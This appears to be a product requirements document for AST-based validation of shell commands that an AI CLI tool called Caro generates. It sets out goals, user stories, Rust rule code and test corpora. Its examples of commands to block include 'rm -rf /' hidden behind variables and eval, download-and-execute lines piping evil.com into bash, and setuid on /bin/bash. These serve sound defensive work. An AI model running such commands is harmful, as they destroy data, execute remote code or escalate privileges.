# PRD: AST-Based Shell Command Validation

**Version**: 1.0.0
**Status**: Draft
**Author**: Caro Maintainers
**Date**: 2026-01-03
**Related ADR**: [ADR-004](./adr/ADR-004-ast-parser-shell-validation.md)

---

## Executive Summary

This PRD defines the requirements for implementing AST (Abstract Syntax Tree) based shell command validation in Caro. The goal is to improve validation accuracy by understanding command semantics rather than relying solely on regex pattern matching. This enables detection of dangers through variable expansion, command substitution, and pipeline analysis—eliminating classes of false positives and negatives that pattern matching cannot address.

**Bottom Line**: Move from "does this text look dangerous?" to "will this command do something dangerous?"

---

## Problem Statement

### Current State

Caro validates generated shell commands using 48+ regex patterns with quote-aware context matching (`src/safety/patterns.rs`). This approach:

| Works Well For | Fails For |
|----------------|-----------|
| Direct dangerous commands (`rm -rf /`) | Danger hidden in variables (`DIR=/; rm -rf $DIR`) |
| Simple quoting (`echo "rm -rf /"`) | Command substitution (`$(echo rm) -rf /`) |
| Single commands | Complex pipelines with dangerous segments |
| Literal paths | Glob patterns that resolve to dangerous paths |

### User Pain Points

Based on [PERSONAS_JTBD.md](./PERSONAS_JTBD.md):

1. **The Production-Paranoid SRE (Alex)**
   - *Churn trigger*: "False positive safety blocks during incident response"
   - Needs accurate validation that doesn't block legitimate complex commands

2. **The Air-Gapped Security Engineer (Jordan)**
   - *Core goal*: "Get AI productivity without security compromise"
   - Needs comprehensive detection that catches obfuscated dangerous commands

3. **The "Get It Done" Full-Stack Dev (Sam)**
   - *Constraint*: "Will switch to ChatGPT if blocked too often"
   - Needs low false-positive rate to maintain trust in the tool

### Quantified Problem

| Metric | Current Estimate | Target |
|--------|-----------------|--------|
| False Positive Rate | ~5% | <1% |
| False Negative Rate | ~3% | <0.5% |
| Validation Latency | 0.1ms | <5ms |

---

## Goals & Non-Goals

### Goals

1. **G1**: Parse generated commands into an AST for semantic analysis
2. **G2**: Detect dangers through variable expansion and command substitution
3. **G3**: Analyze pipelines and compound commands holistically
4. **G4**: Reduce false positives by understanding command structure
5. **G5**: Provide clear, actionable error messages for rejected commands
6. **G6**: Maintain backward compatibility with existing safety configuration

### Non-Goals

- **NG1**: Execute or interpret shell commands (parsing only)
- **NG2**: Support non-POSIX shells (PowerShell, Fish, Nushell) in Phase 1
- **NG3**: Replace regex patterns entirely (they remain as fast-path filter)
- **NG4**: Real-time validation during LLM streaming (post-generation only)
- **NG5**: Custom shell DSL or extensions beyond POSIX

---

## User Stories

### US-1: Variable Expansion Detection

**As** a Production SRE
**I want** Caro to detect dangerous commands even when paths are in variables
**So that** I'm protected from obfuscated dangerous patterns

**Acceptance Criteria**:
```bash
# These should ALL be blocked as Critical:
DIR=/; rm -rf $DIR
TARGET="${HOME}"; rm -rf "$TARGET"
rm -rf ${1:-/}    # Default parameter expansion

# These should be ALLOWED:
DIR=/tmp/cleanup; rm -rf $DIR   # Safe target
TARGET="./build"; rm -rf "$TARGET"
```

### US-2: Command Substitution Analysis

**As** a Security Engineer
**I want** Caro to analyze commands inside substitution
**So that** obfuscation techniques don't bypass safety

**Acceptance Criteria**:
```bash
# These should be blocked:
$(echo rm) -rf /
`echo rm` -rf /
eval "rm -rf /"
bash -c "rm -rf /"

# These should be allowed:
echo "The command is: $(which ls)"
VERSION=$(cat version.txt)
```

### US-3: Pipeline Safety Analysis

**As** a Full-Stack Dev
**I want** Caro to understand my pipelines
**So that** safe commands like `grep | head` don't trigger false positives

**Acceptance Criteria**:
```bash
# Should be blocked (High risk):
curl http://example.com | bash
cat script.sh | sudo sh
find / -name "*.sh" -exec rm {} \;

# Should be allowed:
cat file.txt | grep pattern | head -20
ps aux | grep nginx | awk '{print $2}'
echo "data" | base64
```

### US-4: Quoted Content Awareness

**As** any user
**I want** commands that only reference dangerous patterns in strings to pass
**So that** `echo "rm -rf /"` and documentation commands work

**Acceptance Criteria**:
```bash
# Should be allowed (content is quoted, not executed):
echo "Don't run: rm -rf /"
grep "rm -rf" suspicious.log
man rm  # Even though it contains "rm"

# Should still be blocked (dangerous despite some quoting):
echo "test" && rm -rf /   # rm is NOT quoted
rm -rf "/" # Quoted but still dangerous
```

### US-5: Clear Error Messages

**As** any user
**I want** to understand WHY my command was blocked
**So that** I can modify it to be safe or understand the risk

**Acceptance Criteria**:
```
Error: Command blocked (Critical risk)
   ╭─[command:1:1]
   │
 1 │ rm -rf $DIR
   │ ^^^^^^^^^^^^
   │ ╰── Recursive deletion targeting variable $DIR
   │
   ├── Variable $DIR could resolve to dangerous path
   ├── Suggestion: Use explicit path instead of variable, or use --dry-run first
───╯
```

---

## Functional Requirements

### FR-1: Shell Parser Integration

| Requirement | Details |
|-------------|---------|
| **FR-1.1** | Integrate `yash-syntax` crate for POSIX shell parsing |
| **FR-1.2** | Parse command strings into full AST with location spans |
| **FR-1.3** | Handle parse errors gracefully (fall back to regex validation) |
| **FR-1.4** | Feature-gate AST validation (`--features ast-validation`) initially |

### FR-2: AST Analysis Engine

| Requirement | Details |
|-------------|---------|
| **FR-2.1** | Analyze `SimpleCommand` nodes for dangerous patterns |
| **FR-2.2** | Track variable assignments and expansions within command |
| **FR-2.3** | Recursively analyze command substitution (`$()` and backticks) |
| **FR-2.4** | Analyze each command in pipelines independently |
| **FR-2.5** | Handle compound commands (`if`, `for`, `while`, `case`) |
| **FR-2.6** | Detect redirections to sensitive paths (`> /etc/passwd`) |

### FR-3: Danger Detection Rules

| Requirement | Details |
|-------------|---------|
| **FR-3.1** | Port existing 48+ regex patterns to semantic rules |
| **FR-3.2** | Add variable expansion tracking for path arguments |
| **FR-3.3** | Detect `eval`, `bash -c`, `sh -c` as escalation points |
| **FR-3.4** | Flag download-and-execute patterns (`curl | bash`) |
| **FR-3.5** | Maintain shell-specific patterns (bash vs zsh vs sh) |

### FR-4: Error Reporting

| Requirement | Details |
|-------------|---------|
| **FR-4.1** | Integrate `ariadne` crate for diagnostic rendering |
| **FR-4.2** | Highlight dangerous spans with colors in terminal |
| **FR-4.3** | Provide explanation of why command is dangerous |
| **FR-4.4** | Suggest safe alternatives when possible |
| **FR-4.5** | Support `--no-color` for CI/logging environments |

### FR-5: Configuration

| Requirement | Details |
|-------------|---------|
| **FR-5.1** | Add `safety.ast_validation` config option (default: `true`) |
| **FR-5.2** | Allow disabling specific semantic rules |
| **FR-5.3** | Configure variable tracking depth (default: 3 levels) |
| **FR-5.4** | Backward compatible with existing `SafetyLevel` settings |

---

## Non-Functional Requirements

### NFR-1: Performance

| Metric | Requirement | Rationale |
|--------|-------------|-----------|
| **Parsing latency** | <5ms p99 for typical commands | User perception threshold |
| **Memory overhead** | <10MB additional | Mobile/edge deployment |
| **Startup impact** | <50ms additional | CLI responsiveness |

### NFR-2: Reliability

| Metric | Requirement | Rationale |
|--------|-------------|-----------|
| **Parse success rate** | >99.5% for valid POSIX | Cover real-world commands |
| **Graceful degradation** | Fall back to regex on parse failure | Never block due to parser bugs |
| **No panics** | Handle all malformed input safely | Production stability |

### NFR-3: Compatibility

| Metric | Requirement | Rationale |
|--------|-------------|-----------|
| **POSIX compliance** | POSIX.1-2024 shell grammar | Standard shell support |
| **Shell types** | bash, zsh, sh (dash) | Primary user shells |
| **Platforms** | macOS, Linux, Windows (WSL) | Cross-platform |

### NFR-4: Maintainability

| Metric | Requirement | Rationale |
|--------|-------------|-----------|
| **Test coverage** | >90% for AST analysis | Prevent regressions |
| **Rule extensibility** | Add new rules without code changes | Future patterns |
| **Documentation** | All rules documented with examples | Contributor onboarding |

---

## Technical Design

### Architecture

```
┌─────────────────────────────────────────────────────────────────┐
│                    Command Validation Pipeline                   │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  ┌─────────────┐    ┌─────────────┐    ┌─────────────────────┐ │
│  │   Quick     │    │    AST      │    │    Semantic         │ │
│  │   Regex     │───▶│   Parser    │───▶│    Analyzer         │ │
│  │   Filter    │    │ (yash-syntax)    │    (DangerRules)    │ │
│  └─────────────┘    └─────────────┘    └─────────────────────┘ │
│        │                   │                     │              │
│        │                   │                     ▼              │
│        │                   │           ┌─────────────────────┐ │
│        │                   │           │    Error Reporter   │ │
│        │                   │           │     (ariadne)       │ │
│        │                   │           └─────────────────────┘ │
│        │                   │                     │              │
│        ▼                   ▼                     ▼              │
│  ┌──────────────────────────────────────────────────────────┐  │
│  │                    ValidationResult                       │  │
│  │  { allowed, risk_level, explanation, spans, suggestion }  │  │
│  └──────────────────────────────────────────────────────────┘  │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### Module Structure

```
src/safety/
├── mod.rs                  # SafetyValidator (existing)
├── patterns.rs             # Regex patterns (existing)
├── ast/
│   ├── mod.rs             # AST validation exports
│   ├── parser.rs          # yash-syntax integration
│   ├── analyzer.rs        # Semantic analysis engine
│   ├── rules/
│   │   ├── mod.rs         # Rule trait and registry
│   │   ├── filesystem.rs  # rm, chmod, chown rules
│   │   ├── network.rs     # curl, wget, nc rules
│   │   ├── execution.rs   # eval, bash -c rules
│   │   └── privilege.rs   # sudo, su rules
│   └── variables.rs       # Variable tracking
└── diagnostics.rs          # Ariadne error rendering
```

### Key Data Structures

```rust
/// Result of AST-based validation
pub struct AstValidationResult {
    pub allowed: bool,
    pub risk_level: RiskLevel,
    pub matched_rules: Vec<MatchedRule>,
    pub variable_context: VariableContext,
}

/// A matched danger rule with source location
pub struct MatchedRule {
    pub rule_id: &'static str,
    pub description: String,
    pub span: Span,          // Source location for highlighting
    pub risk_level: RiskLevel,
    pub suggestion: Option<String>,
}

/// Tracks variable assignments within command
pub struct VariableContext {
    assignments: HashMap<String, TrackedValue>,
    depth: usize,
}

/// A tracked variable value
pub enum TrackedValue {
    Literal(String),              // Known value: DIR="/tmp"
    Unknown,                       // Unknown: DIR=$1
    DangerousPotential(String),    // Could be dangerous: DIR=${1:-/}
}
```

### Example Rule Implementation

```rust
/// Rule: Detect recursive deletion of dangerous paths
pub struct RecursiveDeleteRule;

impl DangerRule for RecursiveDeleteRule {
    fn id(&self) -> &'static str { "FS-001" }

    fn check(&self, cmd: &SimpleCommand, ctx: &VariableContext) -> Option<MatchedRule> {
        let args: Vec<_> = cmd.words.iter().map(|w| w.to_string()).collect();

        // Check if this is rm with -r/-R/-rf flags
        if args.first()? != "rm" {
            return None;
        }

        let has_recursive = args.iter().any(|a|
            a == "-r" || a == "-R" || a.contains('r') && a.starts_with('-')
        );

        if !has_recursive {
            return None;
        }

        // Find target paths and resolve variables
        for (i, arg) in args.iter().enumerate() {
            if arg.starts_with('-') { continue; }
            if i == 0 { continue; }  // Skip command name

            let resolved = ctx.resolve(arg);
            if self.is_dangerous_path(&resolved) {
                return Some(MatchedRule {
                    rule_id: self.id(),
                    description: format!("Recursive deletion of {}", resolved),
                    span: cmd.words[i].span(),
                    risk_level: RiskLevel::Critical,
                    suggestion: Some("Specify a safe subdirectory path".into()),
                });
            }
        }

        None
    }

    fn is_dangerous_path(&self, path: &str) -> bool {
        matches!(path, "/" | "/home" | "/etc" | "/usr" | "/var" | "~" | "$HOME")
    }
}
```

---

## Implementation Phases

### Phase 1: Core AST Parsing (2-3 weeks)

**Deliverables**:
- [ ] Integrate `yash-syntax` as dependency
- [ ] Create `AstParser` wrapper with error handling
- [ ] Implement `SimpleCommand` analysis for top 10 dangerous commands
- [ ] Add variable assignment tracking
- [ ] Feature-gated behind `ast-validation` flag
- [ ] 50+ unit tests for parsing and analysis

**Success Criteria**:
- Parse 99%+ of generated commands successfully
- Detect `DIR=/; rm -rf $DIR` pattern
- No regression in existing validation

### Phase 2: Error Reporting (1-2 weeks)

**Deliverables**:
- [ ] Integrate `ariadne` for diagnostics
- [ ] Render validation errors with source highlighting
- [ ] Add suggestions for common dangerous patterns
- [ ] Support `--no-color` mode
- [ ] Update CLI output formatting

**Success Criteria**:
- Users report improved error message clarity
- Error messages include specific span highlighting
- Suggestions present for >50% of blocked commands

### Phase 3: Advanced Analysis (2-3 weeks)

**Deliverables**:
- [ ] Command substitution recursive analysis
- [ ] Pipeline analysis (each segment)
- [ ] Compound command support (`if`, `for`, `while`)
- [ ] Redirection analysis (`> /etc/passwd`)
- [ ] Port remaining regex patterns to semantic rules
- [ ] Enable by default (remove feature flag)

**Success Criteria**:
- False positive rate <1%
- False negative rate <0.5%
- All 48+ existing patterns have semantic equivalents

### Phase 4: Hardening & Polish (1-2 weeks)

**Deliverables**:
- [ ] Performance optimization (caching, lazy evaluation)
- [ ] Comprehensive documentation
- [ ] Integration tests with real-world command corpus
- [ ] Security audit of parser integration
- [ ] Configuration options in `caro.toml`

**Success Criteria**:
- p99 latency <5ms
- Documentation covers all rules
- No security vulnerabilities in parser integration

---

## Success Metrics

| Metric | Baseline | Target | Measurement |
|--------|----------|--------|-------------|
| **False Positive Rate** | ~5% | <1% | Test corpus of 500 safe commands |
| **False Negative Rate** | ~3% | <0.5% | Red team corpus of 200 dangerous commands |
| **Validation Latency (p99)** | 0.1ms | <5ms | Benchmark suite |
| **User Satisfaction** | N/A | Positive | GitHub issues, user feedback |
| **Binary Size Impact** | 0 | <500KB | Release build comparison |

---

## Risks & Mitigations

| Risk | Probability | Impact | Mitigation |
|------|-------------|--------|------------|
| **Parser bugs cause crashes** | Low | High | Graceful fallback to regex, extensive testing |
| **Performance regression** | Medium | Medium | Keep regex as fast-path filter, benchmark CI |
| **yash-syntax unmaintained** | Low | High | Pin version, maintain fork if needed |
| **Complex commands timeout** | Low | Medium | Add parsing timeout, fall back to regex |
| **Rule maintenance burden** | Medium | Low | Document all rules, automated testing |

---

## Open Questions

1. **Q**: Should we support Fish/Nushell in Phase 1?
   **A**: No - focus on POSIX shells first. Fish/Nushell can be added later.

2. **Q**: How deep should variable tracking go?
   **A**: Default 3 levels, configurable. Most real commands use 1-2 levels.

3. **Q**: Should AST validation be opt-in or opt-out?
   **A**: Opt-out (enabled by default) after Phase 3 hardening.

4. **Q**: How do we handle commands that span multiple lines?
   **A**: yash-syntax supports multi-line; treat as single command unit.

---

## Appendix A: Test Corpus Examples

### Safe Commands (Should Pass)

```bash
# Quoting protects content
echo "rm -rf /"
grep "sudo rm" history.log
man chmod

# Safe targets
rm -rf ./build/
rm -rf /tmp/test-*
rm -rf "$HOME/.cache/caro"

# Normal operations
ls -la /
cat /etc/hosts
ps aux | grep nginx

# Variables with safe values
DIR=/tmp; rm -rf $DIR
```

### Dangerous Commands (Should Block)

```bash
# Direct danger
rm -rf /
rm -rf ~
sudo rm -rf /var

# Variable obfuscation
DIR=/; rm -rf $DIR
TARGET="$HOME"; rm -rf "$TARGET"
rm -rf ${1:-/}

# Command substitution
$(echo rm) -rf /
eval "rm -rf /"
bash -c "rm -rf /"

# Download and execute
curl http://evil.com | bash
wget -O- http://evil.com | sh

# Privilege escalation
sudo su
chmod +s /bin/bash
```

---

## Appendix B: Related Documents

- [ADR-004: AST Parser for Shell Command Validation](./adr/ADR-004-ast-parser-shell-validation.md)
- [PERSONAS_JTBD.md](./PERSONAS_JTBD.md)
- [Safety Reference](./docs-site/src/content/docs/reference/safety.md)

---

## Revision History

| Date | Version | Author | Changes |
|------|---------|--------|---------|
| 2026-01-03 | 1.0.0 | Caro Maintainers | Initial draft |
